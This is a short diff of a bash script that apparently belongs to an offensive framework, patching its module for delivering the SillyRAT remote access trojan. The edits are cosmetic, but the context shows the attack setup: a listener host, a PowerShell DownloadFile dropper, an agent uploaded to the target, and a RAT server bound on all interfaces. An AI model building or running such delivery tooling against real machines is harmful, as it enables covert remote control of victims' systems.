@@ -13162,7 +13162,7 @@ echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white
 audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] python3 interpreter not found${white}"
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Remark: python3 its required in Attacker/Target to exec Server/Client.${white}";
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
    echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
 fi
@@ -13170,6 +13170,7 @@ fi
 ## Check if venomconf file exists
 if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
    cd $IPATH/bin/SillyRAT
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
    echo "" && pip3 install -r requirements.txt && echo ""
    ## Write 'venomconf' file to prevent the install function from running again
    echo "venom 'SillyRAT' configuration file" > venomconf
@@ -13200,7 +13201,7 @@ cat << !
     LHOST    : $lhost
     LOLBin   : Powershell (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.exe
-    AGENT    : $IPATH/output/Client.py
+    AGENT    : $IPATH/output/$Drop.py
     UPLOADTO : $rpath => (remote)
 !
 echo "---"
@@ -13257,7 +13258,7 @@ cd $IPATH/output
 cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
 echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
 cd $IPATH
-sleep 1
+sleep 2
 
 
 ## Clean old files.
